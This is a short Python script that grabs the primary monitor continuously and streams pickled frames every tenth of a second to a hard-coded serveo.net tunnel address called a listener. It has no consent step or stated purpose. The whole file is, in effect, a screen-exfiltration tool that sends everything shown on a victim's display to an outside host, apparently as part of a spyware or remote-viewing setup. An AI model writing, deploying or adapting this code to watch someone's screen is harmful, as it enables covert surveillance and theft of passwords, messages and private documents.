import mss
import numpy as np
import pickle
import requests
import time
import cv2  # Ensure you have this installed

# Function to capture the screen
def capture_screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Capture the primary monitor
        while True:
            img = sct.grab(monitor)
            img_np = np.array(img)
            img_np = cv2.cvtColor(img_np, cv2.COLOR_BGRA2BGR)
            yield img_np

def send_screen_to_listener():
    server_url = 'https://0ff85bec34d8a701c49069b4d99144e6.serveo.net'
    screen_gen = capture_screen()

    for screen in screen_gen:
        data = pickle.dumps(screen)
        try:
            response = requests.post(server_url, data=data)
            if response.status_code == 200:
                print("Screen sent successfully.")
            else:
                print(f"Failed to send screen: {response.status_code}")
            time.sleep(0.1)  # Adjust delay as needed for performance
        except Exception as e:
            print(f"Error sending screen: {e}")

if __name__ == "__main__":
    send_screen_to_listener()
